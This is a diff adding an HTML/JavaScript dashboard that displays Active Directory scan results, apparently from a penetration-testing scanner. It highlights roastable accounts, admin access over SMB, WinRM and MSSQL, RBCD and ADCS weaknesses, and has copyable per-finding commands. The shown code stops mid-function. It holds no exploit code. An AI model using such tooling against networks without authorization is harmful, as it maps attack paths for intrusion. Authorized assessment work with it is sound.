@@ -1,0 +1,766 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AD Scan Dashboard</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@600;700;800&display=swap');
+:root {
+  --bg:#080a0d;--bg2:#0d1117;--bg3:#131920;--bg4:#1a2230;
+  --border:#1e2d3d;--border2:#2a3f55;
+  --text:#cdd9e5;--text2:#768a9e;--text3:#3d5166;
+  --accent:#39d0b0;--acc2:#25a88d;
+  --red:#f85149;--amber:#e3b341;--blue:#58a6ff;--purple:#bc8cff;--green:#3fb950;
+  --mono:'JetBrains Mono',monospace;--display:'Syne',sans-serif;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+html,body{height:100%;background:var(--bg);color:var(--text);font-family:var(--mono);font-size:13px;}
+#app{display:flex;height:100vh;}
+
+/* sidebar */
+#sidebar{width:210px;min-width:210px;background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;}
+.sb-head{padding:16px 14px 12px;border-bottom:1px solid var(--border);}
+.sb-logo{font-family:var(--display);font-size:17px;font-weight:800;color:var(--accent);}
+.sb-domain{font-size:10px;color:var(--text3);margin-top:3px;word-break:break-all;}
+.sb-nav{padding:8px 6px;flex:1;overflow-y:auto;}
+.nav-section-label{font-size:9px;color:var(--text3);letter-spacing:.12em;text-transform:uppercase;padding:10px 10px 5px;}
+.nav-item{display:flex;align-items:center;gap:9px;padding:8px 10px;border-radius:5px;cursor:pointer;margin-bottom:1px;transition:all .12s;border:1px solid transparent;color:var(--text2);}
+.nav-item:hover{background:var(--bg3);color:var(--text);}
+.nav-item.active{background:var(--bg4);border-color:var(--border2);color:var(--accent);}
+.nav-icon{font-size:13px;width:18px;text-align:center;flex-shrink:0;}
+.nav-label{font-size:12px;font-weight:500;}
+.nav-count{margin-left:auto;font-size:10px;background:var(--bg3);border:1px solid var(--border);border-radius:3px;padding:1px 6px;color:var(--text3);flex-shrink:0;}
+.nav-count.red{background:rgba(248,81,73,.12);border-color:rgba(248,81,73,.3);color:var(--red);}
+.nav-count.amber{background:rgba(227,179,65,.12);border-color:rgba(227,179,65,.3);color:var(--amber);}
+.nav-count.blue{background:rgba(88,166,255,.12);border-color:rgba(88,166,255,.3);color:var(--blue);}
+.sb-footer{padding:10px;border-top:1px solid var(--border);}
+.scan-time{font-size:9px;color:var(--text3);line-height:1.8;white-space:pre-wrap;}
+
+/* main */
+#main{flex:1;display:flex;flex-direction:column;overflow:hidden;}
+#topbar{padding:11px 18px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;background:var(--bg2);flex-shrink:0;}
+.tb-title{font-family:var(--display);font-size:14px;font-weight:700;}
+.tb-gap{flex:1;}
+.tb-btn{background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:5px 12px;font-size:11px;font-family:var(--mono);color:var(--text2);cursor:pointer;}
+.tb-btn:hover{border-color:var(--border2);color:var(--text);}
+.tb-badge{font-size:10px;padding:3px 9px;border-radius:3px;border:1px solid;font-family:var(--mono);}
+.badge-crit{background:rgba(248,81,73,.1);border-color:rgba(248,81,73,.3);color:var(--red);}
+.badge-ok{background:rgba(63,185,80,.1);border-color:rgba(63,185,80,.3);color:var(--green);}
+#content{flex:1;overflow-y:auto;padding:20px;}
+
+/* load */
+#load-screen{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;text-align:center;}
+#load-screen .big{font-family:var(--display);font-size:52px;font-weight:800;opacity:.07;margin-bottom:16px;}
+#load-screen p{font-size:13px;line-height:2;color:var(--text2);}
+code{font-size:12px;background:var(--bg3);border:1px solid var(--border);padding:2px 8px;border-radius:4px;color:var(--amber);}
+.load-btn{margin-top:20px;padding:10px 24px;background:var(--accent);color:#080a0d;border:none;border-radius:6px;font-size:12px;font-weight:700;font-family:var(--mono);cursor:pointer;}
+
+.page{display:none;} .page.active{display:block;}
+
+/* stat grid */
+.stat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(145px,1fr));gap:10px;margin-bottom:20px;}
+.stat-card{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:14px 16px;}
+.stat-card.alert{border-color:rgba(248,81,73,.3);background:rgba(248,81,73,.04);}
+.stat-card.warn{border-color:rgba(227,179,65,.3);background:rgba(227,179,65,.04);}
+.stat-card.good{border-color:rgba(63,185,80,.3);background:rgba(63,185,80,.04);}
+.stat-label{font-size:10px;color:var(--text3);letter-spacing:.07em;text-transform:uppercase;margin-bottom:6px;}
+.stat-val{font-size:26px;font-weight:700;font-family:var(--display);line-height:1;}
+.stat-sub{font-size:10px;color:var(--text3);margin-top:4px;}
+.stat-card.alert .stat-val{color:var(--red);} .stat-card.warn .stat-val{color:var(--amber);} .stat-card.good .stat-val{color:var(--green);}
+
+/* section head */
+.sh{font-family:var(--display);font-size:13px;font-weight:700;color:var(--accent);margin:0 0 12px;display:flex;align-items:center;gap:8px;}
+.sh::after{content:'';flex:1;height:1px;background:var(--border);}
+
+/* findings */
+.finding{background:var(--bg2);border:1px solid var(--border);border-radius:8px;margin-bottom:8px;overflow:hidden;}
+.fh{display:flex;align-items:center;gap:10px;padding:11px 14px;cursor:pointer;transition:background .12s;}
+.fh:hover{background:var(--bg3);}
+.sev{font-size:10px;font-weight:700;padding:2px 8px;border-radius:3px;letter-spacing:.05em;flex-shrink:0;}
+.sev-CRITICAL{background:rgba(248,81,73,.15);color:var(--red);border:1px solid rgba(248,81,73,.3);}
+.sev-HIGH{background:rgba(227,179,65,.15);color:var(--amber);border:1px solid rgba(227,179,65,.3);}
+.sev-MEDIUM{background:rgba(88,166,255,.15);color:var(--blue);border:1px solid rgba(88,166,255,.3);}
+.sev-LOW{background:rgba(63,185,80,.15);color:var(--green);border:1px solid rgba(63,185,80,.3);}
+.ft{font-size:13px;font-weight:500;}
+.fd{font-size:11px;color:var(--text2);margin-left:auto;max-width:38%;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.chev{color:var(--text3);font-size:10px;margin-left:8px;transition:transform .15s;flex-shrink:0;}
+.fbody{display:none;border-top:1px solid var(--border);padding:12px 14px;}
+.fbody.open{display:block;}
+
+/* cmd block */
+.cmd{background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:8px 12px;position:relative;margin-top:8px;}
+.cmd pre{font-size:12px;color:var(--green);word-break:break-all;white-space:pre-wrap;padding-right:55px;line-height:1.7;font-family:var(--mono);}
+.cpbtn{position:absolute;top:8px;right:8px;background:transparent;border:1px solid var(--border2);border-radius:3px;padding:2px 8px;font-size:10px;font-family:var(--mono);color:var(--text3);cursor:pointer;}
+.cpbtn:hover{color:var(--text);}
+
+/* service tables — SMB / WinRM / MSSQL */
+.svc-toolbar{display:flex;align-items:center;gap:8px;margin-bottom:12px;flex-wrap:wrap;}
+.svc-search{background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:6px 10px;font-family:var(--mono);font-size:12px;color:var(--text);outline:none;width:200px;}
+.svc-search:focus{border-color:var(--border2);}
+.sort-btn{display:flex;align-items:center;gap:5px;padding:5px 12px;border-radius:5px;border:1px solid var(--border);font-size:11px;font-family:var(--mono);cursor:pointer;background:transparent;color:var(--text2);transition:all .12s;}
+.sort-btn:hover,.sort-btn.active{border-color:rgba(248,81,73,.4);color:var(--red);background:rgba(248,81,73,.06);}
+.dot{width:8px;height:8px;border-radius:50%;background:var(--red);flex-shrink:0;}
+.svc-count{font-size:11px;color:var(--text3);margin-left:auto;}
+
+/* main service table */
+.svc-table-wrap{background:var(--bg2);border:1px solid var(--border);border-radius:8px;overflow:hidden;}
+table{width:100%;border-collapse:collapse;}
+th{padding:9px 14px;text-align:left;font-size:10px;color:var(--text3);letter-spacing:.07em;text-transform:uppercase;border-bottom:1px solid var(--border);background:var(--bg3);font-weight:400;cursor:pointer;user-select:none;white-space:nowrap;}
+th:hover{color:var(--text2);}
+th .sort-arrow{display:inline-block;margin-left:4px;opacity:.4;}
+th.sorted .sort-arrow{opacity:1;color:var(--accent);}
+td{padding:9px 14px;font-size:12px;border-bottom:1px solid var(--border);vertical-align:middle;}
+tr:last-child td{border-bottom:none;}
+tr:hover td{background:var(--bg3);}
+tr.row-admin td{background:rgba(248,81,73,.03);}
+tr.row-admin:hover td{background:rgba(248,81,73,.07);}
+
+/* inline badges */
+.badge{display:inline-flex;align-items:center;gap:4px;font-size:10px;font-weight:700;padding:2px 7px;border-radius:3px;white-space:nowrap;}
+.b-admin{background:rgba(248,81,73,.15);color:var(--red);border:1px solid rgba(248,81,73,.3);}
+.b-write{background:rgba(227,179,65,.15);color:var(--amber);border:1px solid rgba(227,179,65,.3);}
+.b-read{background:rgba(88,166,255,.12);color:var(--blue);border:1px solid rgba(88,166,255,.2);}
+.b-auth{background:rgba(63,185,80,.12);color:var(--green);border:1px solid rgba(63,185,80,.2);}
+.b-sysadmin{background:rgba(248,81,73,.15);color:var(--red);border:1px solid rgba(248,81,73,.3);}
+.b-open{background:rgba(118,138,158,.1);color:var(--text2);border:1px solid rgba(118,138,158,.2);}
+.b-no{color:var(--text3);font-size:11px;}
+
+/* share pills */
+.share-list{display:flex;flex-wrap:wrap;gap:4px;}
+.share-pill{font-size:10px;padding:1px 7px;border-radius:3px;border:1px solid;}
+.sp-admin{background:rgba(248,81,73,.1);color:var(--red);border-color:rgba(248,81,73,.25);}
+.sp-write{background:rgba(227,179,65,.1);color:var(--amber);border-color:rgba(227,179,65,.25);}
+.sp-read{background:rgba(88,166,255,.08);color:var(--blue);border-color:rgba(88,166,255,.2);}
+
+/* expand row */
+.exp-row td{padding:0;background:var(--bg3)!important;border-bottom:1px solid var(--border);}
+.exp-inner{padding:12px 14px;}
+.exp-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px;}
+.exp-box{background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:10px 12px;}
+.exp-label{font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:.07em;margin-bottom:6px;}
+.exp-item{font-size:12px;padding:3px 0;border-bottom:1px solid var(--border);color:var(--text2);}
+.exp-item:last-child{border-bottom:none;}
+
+/* rbcd */
+.rbcd-card{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:14px;margin-bottom:10px;}
+.rbcd-card.vuln{border-color:rgba(248,81,73,.3);background:rgba(248,81,73,.03);}
+.rbcd-card.ok{border-color:rgba(63,185,80,.3);background:rgba(63,185,80,.03);}
+.rbcd-card.warn{border-color:rgba(227,179,65,.3);background:rgba(227,179,65,.03);}
+.rbcd-title{font-size:13px;font-weight:500;margin-bottom:4px;}
+.rbcd-detail{font-size:12px;color:var(--text2);margin-bottom:10px;line-height:1.7;}
+
+/* users table */
+.flag{display:inline-block;font-size:9px;padding:1px 6px;border-radius:3px;margin:1px 2px 1px 0;font-weight:500;}
+.flag-red{background:rgba(248,81,73,.12);color:var(--red);border:1px solid rgba(248,81,73,.2);}
+.flag-amber{background:rgba(227,179,65,.12);color:var(--amber);border:1px solid rgba(227,179,65,.2);}
+.flag-blue{background:rgba(88,166,255,.12);color:var(--blue);border:1px solid rgba(88,166,255,.2);}
+.flag-gray{background:rgba(118,138,158,.1);color:var(--text2);border:1px solid rgba(118,138,158,.2);}
+
+/* groups */
+.group-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:10px;}
+.group-card{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:12px 14px;}
+.group-name{font-size:12px;font-weight:500;color:var(--accent);margin-bottom:8px;}
+.group-member{font-size:11px;color:var(--text2);padding:3px 0;border-bottom:1px solid var(--border);}
+.group-member:last-child{border-bottom:none;}
+
+/* policy / trust */
+.policy-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:10px;margin-bottom:16px;}
+.policy-item{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:12px 14px;}
+.policy-label{font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:.07em;margin-bottom:4px;}
+.policy-val{font-size:20px;font-weight:700;font-family:var(--display);}
+.trust-card{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:12px 14px;margin-bottom:8px;}
+.trust-name{font-size:13px;font-weight:500;margin-bottom:3px;}
+.trust-meta{font-size:11px;color:var(--text2);}
+
+/* adcs */
+.adcs-vuln{background:rgba(248,81,73,.04);border:1px solid rgba(248,81,73,.3);border-radius:8px;padding:14px;margin-bottom:10px;}
+.adcs-safe{background:rgba(63,185,80,.04);border:1px solid rgba(63,185,80,.3);border-radius:8px;padding:14px;margin-bottom:10px;}
+.adcs-title{font-size:13px;font-weight:500;margin-bottom:6px;}
+.adcs-vuln .adcs-title{color:var(--red);} .adcs-safe .adcs-title{color:var(--green);}
+.adcs-detail{font-size:12px;color:var(--text2);margin-bottom:10px;line-height:1.7;}
+
+.no-data{padding:28px;text-align:center;color:var(--text3);font-size:12px;}
+::-webkit-scrollbar{width:5px;} ::-webkit-scrollbar-track{background:transparent;} ::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px;}
+</style>
+</head>
+<body>
+<div id="app">
+  <div id="sidebar">
+    <div class="sb-head">
+      <div class="sb-logo">AD//</div>
+      <div class="sb-domain" id="sbDomain">no scan loaded</div>
+    </div>
+    <div class="sb-nav">
+      <div class="nav-section-label">Overview</div>
+      <div class="nav-item active" onclick="nav('overview')" id="nav-overview"><span class="nav-icon">◈</span><span class="nav-label">Dashboard</span></div>
+      <div class="nav-item" onclick="nav('findings')" id="nav-findings"><span class="nav-icon">⚑</span><span class="nav-label">Findings</span><span class="nav-count red" id="nc-findings">0</span></div>
+
+      <div class="nav-section-label">Services</div>
+      <div class="nav-item" onclick="nav('smb')" id="nav-smb"><span class="nav-icon">◫</span><span class="nav-label">SMB</span><span class="nav-count" id="nc-smb">0</span></div>
+      <div class="nav-item" onclick="nav('winrm')" id="nav-winrm"><span class="nav-icon">▷</span><span class="nav-label">WinRM</span><span class="nav-count" id="nc-winrm">0</span></div>
+      <div class="nav-item" onclick="nav('mssql')" id="nav-mssql"><span class="nav-icon">◉</span><span class="nav-label">MSSQL</span><span class="nav-count" id="nc-mssql">0</span></div>
+
+      <div class="nav-section-label">AD</div>
+      <div class="nav-item" onclick="nav('users')" id="nav-users"><span class="nav-icon">◎</span><span class="nav-label">Users</span><span class="nav-count" id="nc-users">0</span></div>
+      <div class="nav-item" onclick="nav('groups')" id="nav-groups"><span class="nav-icon">⬡</span><span class="nav-label">Groups</span></div>
+      <div class="nav-item" onclick="nav('rbcd')" id="nav-rbcd"><span class="nav-icon">⟳</span><span class="nav-label">RBCD</span><span class="nav-count" id="nc-rbcd">0</span></div>
+      <div class="nav-item" onclick="nav('adcs')" id="nav-adcs"><span class="nav-icon">✦</span><span class="nav-label">ADCS</span><span class="nav-count" id="nc-adcs">0</span></div>
+    </div>
+    <div class="sb-footer"><div class="scan-time" id="scanTime">—</div></div>
+  </div>
+
+  <div id="main">
+    <div id="topbar">
+      <div class="tb-title" id="tbTitle">AD Scan Dashboard</div>
+      <div class="tb-gap"></div>
+      <div class="tb-badge" id="smbBadge" style="display:none"></div>
+      <button class="tb-btn" onclick="document.getElementById('fi').click()">⊕ Load JSON</button>
+    </div>
+    <div id="content">
+
+      <!-- Load -->
+      <div id="load-screen">
+        <div class="big">AD//</div>
+        <p>Run scanner first:<br>
+        <code>python3 scanner.py -u user -p pass -d domain.local -dc-ip 10.x.x.x -dns 10.x.x.x</code><br><br>
+        Then serve:<br><code>python3 -m http.server 8080</code></p>
+        <button class="load-btn" onclick="document.getElementById('fi').click()">Load scan_results.json</button>
+      </div>
+
+      <!-- Overview -->
+      <div class="page" id="page-overview">
+        <div class="stat-grid" id="statGrid"></div>
+        <div class="sh">Password Policy</div>
+        <div class="policy-grid" id="policyGrid"></div>
+        <div class="sh">Domain Trusts</div>
+        <div id="trustList"></div>
+      </div>
+
+      <!-- Findings -->
+      <div class="page" id="page-findings"><div id="findingsList"></div></div>
+
+      <!-- SMB -->
+      <div class="page" id="page-smb">
+        <div class="svc-toolbar">
+          <input class="svc-search" id="smbSearch" placeholder="Search hostname / IP..." oninput="renderSMB()">
+          <button class="sort-btn" id="sort-smb-admin" onclick="toggleSortAdmin('smb')">
+            <span class="dot"></span> Local Admin first
+          </button>
+          <span class="svc-count" id="smb-count"></span>
+        </div>
+        <div class="svc-table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th onclick="sortSvc('smb','hostname')">Host <span class="sort-arrow">↕</span></th>
+                <th onclick="sortSvc('smb','ip')">IP <span class="sort-arrow">↕</span></th>
+                <th>Read Access</th>
+                <th>Write Access</th>
+                <th onclick="sortSvc('smb','local_admin')">Local Admin <span class="sort-arrow">↕</span></th>
+                <th></th>
+              </tr>
+            </thead>
+            <tbody id="smbTbody"></tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- WinRM -->
+      <div class="page" id="page-winrm">
+        <div class="svc-toolbar">
+          <input class="svc-search" id="winrmSearch" placeholder="Search hostname / IP..." oninput="renderWinRM()">
+          <button class="sort-btn" id="sort-winrm-admin" onclick="toggleSortAdmin('winrm')">
+            <span class="dot"></span> Local Admin first
+          </button>
+          <span class="svc-count" id="winrm-count"></span>
+        </div>
+        <div class="svc-table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th onclick="sortSvc('winrm','hostname')">Host <span class="sort-arrow">↕</span></th>
+                <th onclick="sortSvc('winrm','ip')">IP <span class="sort-arrow">↕</span></th>
+                <th>OS</th>
+                <th onclick="sortSvc('winrm','port')">Port <span class="sort-arrow">↕</span></th>
+                <th onclick="sortSvc('winrm','auth')">Authenticated <span class="sort-arrow">↕</span></th>
+                <th onclick="sortSvc('winrm','local_admin')">Local Admin <span class="sort-arrow">↕</span></th>
+                <th></th>
+              </tr>
+            </thead>
+            <tbody id="winrmTbody"></tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- MSSQL -->
+      <div class="page" id="page-mssql">
+        <div class="svc-toolbar">
+          <input class="svc-search" id="mssqlSearch" placeholder="Search hostname / IP..." oninput="renderMSSQL()">
+          <button class="sort-btn" id="sort-mssql-admin" onclick="toggleSortAdmin('mssql')">
+            <span class="dot"></span> Sysadmin first
+          </button>
+          <span class="svc-count" id="mssql-count"></span>
+        </div>
+        <div class="svc-table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th onclick="sortSvc('mssql','hostname')">Host <span class="sort-arrow">↕</span></th>
+                <th onclick="sortSvc('mssql','ip')">IP <span class="sort-arrow">↕</span></th>
+                <th>OS</th>
+                <th onclick="sortSvc('mssql','auth')">Auth OK <span class="sort-arrow">↕</span></th>
+                <th onclick="sortSvc('mssql','sysadmin')">Sysadmin <span class="sort-arrow">↕</span></th>
+                <th></th>
+              </tr>
+            </thead>
+            <tbody id="mssqlTbody"></tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Users -->
+      <div class="page" id="page-users">
+        <div class="svc-toolbar">
+          <input class="svc-search" id="userSearch" placeholder="Search username / description..." oninput="filterUsers()">
+          <span class="svc-count" id="user-count"></span>
+        </div>
+        <div class="svc-table-wrap">
+          <table>
+            <thead><tr><th>Username</th><th>Display Name</th><th>Flags</th><th>SPNs</th><th>Description</th></tr></thead>
+            <tbody id="userTbody"></tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Groups -->
+      <div class="page" id="page-groups"><div class="group-grid" id="groupGrid"></div></div>
+
+      <!-- RBCD -->
+      <div class="page" id="page-rbcd"><div id="rbcdContent"></div></div>
+
+      <!-- ADCS -->
+      <div class="page" id="page-adcs"><div id="adcsContent"></div></div>
+
+    </div>
+  </div>
+</div>
+
+<input type="file" id="fi" accept=".json" style="display:none" onchange="handleFile(event)">
+
+<script>
+let D = null;
+let allUsers = [];
+let svcSort = { smb:{field:'local_admin',adminFirst:true}, winrm:{field:'local_admin',adminFirst:true}, mssql:{field:'sysadmin',adminFirst:true} };
+let expandedRows = {};
+
+// ── Load ─────────────────────────────────────────────────────────────────────
+function handleFile(e) {
+  const f = e.target.files[0]; if (!f) return;
+  const r = new FileReader();
+  r.onload = ev => {
+    try {
+      D = JSON.parse(ev.target.result);
+      document.getElementById('load-screen').style.display = 'none';
+      renderAll(); nav('overview');
+    } catch(err) { alert('Bad JSON: ' + err.message); }
+  };
+  r.readAsText(f);
+}
+
+function renderAll() {
+  const meta = D.meta||{}, sum = D.summary||{};
+  document.getElementById('sbDomain').textContent = meta.domain||'—';
+  document.getElementById('tbTitle').textContent  = (meta.domain||'AD') + ' // Scan Results';
+  document.getElementById('scanTime').textContent = 'Scanned: '+(meta.scan_time?new Date(meta.scan_time).toLocaleString():'—')+'\nBy: '+(meta.scanned_by||'—');
+
+  const sb = document.getElementById('smbBadge');
+  sb.style.display = 'inline';
+  if (meta.smb_signing===false) { sb.className='tb-badge badge-crit'; sb.textContent='⚠ SMB SIGNING OFF'; }
+  else { sb.className='tb-badge badge-ok'; sb.textContent='✓ SMB SIGNING ON'; }
+
+  const comps = D.computers||[];
+  const smbHosts   = comps.filter(c => (c.shares_read||[]).length > 0 || c.local_admin);
+  const winrmHosts  = comps.filter(c => c.winrm && c.winrm.available);
+  const mssqlHosts  = comps.filter(c => c.mssql && c.mssql.available);
+  const rbcdViable = (D.rbcd||{}).can_add_computer || (D.rbcd||{}).existing_rbcd?.length > 0 || (D.rbcd||{}).t2a4d_users?.length > 0;
+
+  document.getElementById('nc-findings').textContent = (D.findings||[]).length;
+  document.getElementById('nc-smb').textContent      = smbHosts.length;
+  document.getElementById('nc-winrm').textContent    = winrmHosts.length;
+  document.getElementById('nc-mssql').textContent    = mssqlHosts.length;
+  document.getElementById('nc-users').textContent    = sum.total_users||0;
+  document.getElementById('nc-adcs').textContent     = (D.adcs_vulns||[]).length;
+  document.getElementById('nc-rbcd').textContent     = rbcdViable ? '!' : '0';
+  if (rbcdViable) document.getElementById('nc-rbcd').className = 'nav-count amber';
+  if ((D.adcs_vulns||[]).length > 0) document.getElementById('nc-adcs').className = 'nav-count red';
+  const winrmAdmin = winrmHosts.filter(c=>c.winrm.local_admin).length;
+  const mssqlSys   = mssqlHosts.filter(c=>c.mssql.sysadmin).length;
+  if (winrmAdmin > 0) document.getElementById('nc-winrm').className = 'nav-count red';
+  if (mssqlSys > 0)   document.getElementById('nc-mssql').className = 'nav-count red';
+
+  allUsers = D.users||[];
+  renderOverview(); renderFindings(); renderSMB(); renderWinRM(); renderMSSQL();
+  renderUsers(); renderGroups(); renderRBCD(); renderAdcs();
+}
+
+// ── Overview ─────────────────────────────────────────────────────────────────
+function renderOverview() {
+  const sum = D.summary||{};
+  const cards = [
+    {label:'Total Users',val:sum.total_users||0,cls:'',sub:'in directory'},
+    {label:'Disabled',val:sum.disabled_users||0,cls:'',sub:'accounts'},
+    {label:'Kerberoastable',val:sum.kerberoastable||0,cls:sum.kerberoastable>0?'alert':'good',sub:'service accounts'},
+    {label:'AS-REP Roastable',val:sum.asrep_roastable||0,cls:sum.asrep_roastable>0?'alert':'good',sub:'no pre-auth'},
+    {label:'SMB Local Admin',val:sum.local_admin_hosts||0,cls:sum.local_admin_hosts>0?'warn':'good',sub:'hosts'},
+    {label:'WinRM Admin',val:sum.winrm_admin_hosts||0,cls:sum.winrm_admin_hosts>0?'warn':'good',sub:'hosts'},
+    {label:'MSSQL Sysadmin',val:sum.mssql_sysadmin_hosts||0,cls:sum.mssql_sysadmin_hosts>0?'warn':'good',sub:'hosts'},
+    {label:'Uncons. Delegation',val:sum.unconstrained_deleg||0,cls:sum.unconstrained_deleg>0?'alert':'good',sub:'hosts'},
+    {label:'ADCS Vulns',val:sum.adcs_vulns||0,cls:sum.adcs_vulns>0?'alert':'good',sub:'templates'},
+    {label:'RBCD Viable',val:(D.rbcd||{}).can_add_computer?'YES':'NO',cls:(D.rbcd||{}).can_add_computer?'warn':'good',sub:'MachineAccountQuota='+((D.summary||{}).machine_quota||0)},
+    {label:'Cred in Desc',val:sum.interesting_descs||0,cls:sum.interesting_descs>0?'warn':'good',sub:'accounts'},
+  ];
+  document.getElementById('statGrid').innerHTML = cards.map(c =>
+    `<div class="stat-card ${c.cls}"><div class="stat-label">${c.label}</div><div class="stat-val">${c.val}</div><div class="stat-sub">${c.sub}</div></div>`
+  ).join('');
+
+  const pp = D.password_policy||{};
+  document.getElementById('policyGrid').innerHTML = [
+    {label:'Min Length',val:pp.min_length||'?'},{label:'History',val:pp.history_length||'?'},{label:'Lockout Threshold',val:pp.lockout_threshold||'?'}
+  ].map(p=>`<div class="policy-item"><div class="policy-label">${p.label}</div><div class="policy-val">${p.val}</div></div>`).join('');
+
+  const trusts = D.trusts||[];
+  document.getElementById('trustList').innerHTML = trusts.length===0
+    ? '<div class="no-data">No domain trusts found.</div>'
+    : trusts.map(t=>`<div class="trust-card"><div class="trust-name">${esc(t.name||'?')}</div><div class="trust-meta">Type: ${t.type} | Direction: ${t.direction} | Attributes: ${t.attributes}</div></div>`).join('');
+}
+
+// ── Findings ─────────────────────────────────────────────────────────────────
+function renderFindings() {
+  const findings = D.findings||[];
+  if (!findings.length) { document.getElementById('findingsList').innerHTML='<div class="no-data">No findings.</div>'; return; }
+  const order={CRITICAL:0,HIGH:1,MEDIUM:2,LOW:3};
+  const sorted=[...findings].sort((a,b)=>(order[a.severity]||9)-(order[b.severity]||9));
+  document.getElementById('findingsList').innerHTML = sorted.map((f,i)=>`
+    <div class="finding">
+      <div class="fh" onclick="toggleF(${i})">
+        <span class="sev sev-${f.severity}">${f.severity}</span>
+        <span class="ft">${esc(f.title)}</span>
+        <span class="fd">${esc(f.detail||'')}</span>
+        <span class="chev" id="fc-${i}">▼</span>
+      </div>
+      <div class="fbody" id="fb-${i}">
+        <div style="font-size:12px;color:var(--text2);margin-bottom:8px;line-height:1.7">${esc(f.detail||'')}</div>
+        ${f.command?`<div class="cmd"><pre>${esc(f.command)}</pre><button class="cpbtn" onclick="cp('${enc(f.command)}',this)">copy</button></div>`:''}
+      </div>
+    </div>`).join('');
+}
+function toggleF(i){const b=document.getElementById('fb-'+i),c=document.getElementById('fc-'+i);const o=b.classList.toggle('open');c.style.transform=o?'rotate(180deg)':'';}
+
+// ── SMB Page ──────────────────────────────────────────────────────────────────
+function toggleSortAdmin(svc) {
+  svcSort[svc].adminFirst = !svcSort[svc].adminFirst;
+  const btn = document.getElementById('sort-'+svc+'-admin');
+  btn.classList.toggle('active', svcSort[svc].adminFirst);
+  if (svc==='smb') renderSMB();
+  else if (svc==='winrm') renderWinRM();
+  else renderMSSQL();
+}
+
+function sortSvc(svc, field) {
+  svcSort[svc].field = field;
+  if (svc==='smb') renderSMB();
+  else if (svc==='winrm') renderWinRM();
+  else renderMSSQL();
+}
+
+function renderSMB() {
+  const comps = D.computers||[];
+  const q = (document.getElementById('smbSearch')||{}).value||'';
+  // Only hosts that have any shares at all
+  let rows = comps.filter(c => (c.shares_all||[]).length > 0 || c.local_admin);
+  if (q) rows = rows.filter(c=>(c.hostname||'').toLowerCase().includes(q.toLowerCase())||(c.ip||'').includes(q));
+
+  // Sort: admin first toggle, then by field
+  rows.sort((a,b) => {
+    if (svcSort.smb.adminFirst) {
+      if (a.local_admin && !b.local_admin) return -1;
+      if (!a.local_admin && b.local_admin) return 1;
+    }
+    return 0;
+  });
+
+  document.getElementById('smb-count').textContent = rows.length + ' host' + (rows.length!==1?'s':'');
+  const tbody = document.getElementById('smbTbody');
+  if (!rows.length) { tbody.innerHTML=`<tr><td colspan="6" class="no-data">No SMB hosts found.</td></tr>`; return; }
+
+  tbody.innerHTML = rows.map((c,i) => {
+    const readShares  = c.shares_read||[];
+    const writeShares = c.shares_write||[];
+    const adminShares = ['ADMIN$','C$','IPC$'];
+
+    const readHtml = readShares.length===0 ? '<span class="b-no">—</span>' :
+      `<div class="share-list">${readShares.map(s=>`<span class="share-pill ${adminShares.includes(s.toUpperCase())?'sp-admin':(writeShares.includes(s)?'sp-write':'sp-read')}">${esc(s)}</span>`).join('')}</div>`;
+
+    const writeHtml = writeShares.length===0 ? '<span class="b-no">—</span>' :
+      `<div class="share-list">${writeShares.map(s=>`<span class="share-pill sp-write">${esc(s)}</span>`).join('')}</div>`;
+
+    const adminHtml = c.local_admin
+      ? `<span class="badge b-admin">● LOCAL ADMIN</span>`
+      : `<span class="b-no">no</span>`;
+
+    const uid = 'smb-'+i;
+    return `<tr class="${c.local_admin?'row-admin':''}" onclick="toggleRow('${uid}',this)" style="cursor:pointer">
+      <td><strong>${esc(c.hostname||c.dns_name||'?')}</strong><div style="font-size:10px;color:var(--text3)">${esc(c.dns_name||'')}</div></td>
+      <td style="font-family:var(--mono);color:var(--blue)">${esc(c.ip||'—')}</td>
+      <td>${readHtml}</td>
+      <td>${writeHtml}</td>
+      <td>${adminHtml}</td>
+      <td style="text-align:right;color:var(--text3);font-size:11px" id="chev-${uid}">▼</td>
+    </tr>
+    <tr class="exp-row" id="exp-${uid}" style="display:none">
+      <td colspan="6">
+        <div class="exp-inner">
+          <div class="exp-grid">
+            <div class="exp-box">
+              <div class="exp-label">Read shares</div>
+              ${readShares.length?readShares.map(s=>`<div class="exp-item">${esc(s)}</div>`).join(''):'<div class="exp-item" style="color:var(--text3)">none</div>'}
+            </div>
+            <div class="exp-box">
+              <div class="exp-label">Write shares</div>
+              ${writeShares.length?writeShares.map(s=>`<div class="exp-item">${esc(s)}</div>`).join(''):'<div class="exp-item" style="color:var(--text3)">none</div>'}
+            </div>
+          </div>
